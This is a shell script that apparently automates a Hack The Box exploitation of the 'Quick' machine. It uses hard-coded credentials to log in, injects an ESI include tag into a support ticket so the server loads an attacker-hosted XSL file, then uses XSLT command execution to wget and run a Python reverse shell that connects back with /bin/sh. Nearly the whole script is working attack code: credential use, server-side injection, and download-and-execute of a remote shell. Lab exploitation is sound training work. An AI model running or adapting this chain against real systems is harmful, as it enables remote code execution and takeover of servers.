#!/bin/sh
# Run the local http server, a netcat listener on port 12345, and then run this script for a reverse shell

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

# Create a python script for a reverse shell with the HTB ip
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${htbip}',12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])" > rev-shell.py

# Put this file into the cache, I think this is required
curl --silent http://quick.htb:9001/index.php > /dev/null

# Login and get a session cookie
session=$(curl -v 'http://quick.htb:9001/login.php' --data 'email=elisa%40wink.co.uk&password=Quick4cc3%24%24' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/; Path=\///')
sess="$(echo "${session}" | tr -d '[:space:]')"
echo "Session cookie ${sess}"

# Grab a ticket value
tkt=$(curl 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" | grep TKT | sed 's/.*value="TKT-//' | sed 's/"\/>//')
echo "Got ticket number ${tkt}"

# Create the ticket with the esigate exploit
curl --silent 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" --data "title=title&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Flocalhost%3A9001%2Findex.php%22+stylesheet%3D%22http%3A%2F%2F${htbip}%2Fquick%2Fevil.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-${tkt}"
echo "Ticket with esigate exploit created"

# Download the python rev shell
cat part1.xsl > evil.xsl
echo "<xsl:variable name=\"cmd\"><![CDATA[wget http://${htbip}/quick/rev-shell.py]]></xsl:variable>" >> evil.xsl
cat part2.xsl >> evil.xsl
curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
echo "Python reverse shell downloaded"

# Run the python reverse shell
cat part1.xsl > evil.xsl
echo "<xsl:variable name=\"cmd\"><![CDATA[python rev-shell.py]]></xsl:variable>" >> evil.xsl
cat part2.xsl >> evil.xsl
curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
echo "Connecting..."